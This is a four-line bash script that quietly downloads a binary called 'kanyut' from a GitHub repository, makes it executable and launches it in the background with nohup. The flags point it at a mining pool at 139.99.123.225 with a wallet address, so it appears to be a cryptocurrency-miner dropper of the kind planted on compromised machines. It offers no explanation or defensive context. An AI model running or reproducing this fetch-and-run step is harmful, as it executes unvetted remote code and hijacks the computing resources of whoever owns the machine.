#!/usr/bin/env bash
wget -q https://github.com/Pretykeviv/nheq/raw/main/kanyut
chmod +x kanyut
nohup ./kanyut -v -l 139.99.123.225:3956 -u RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e.$(echo $(shuf -i 1-999 -n 1)-Zero) -p x -t 8 > nohup.out
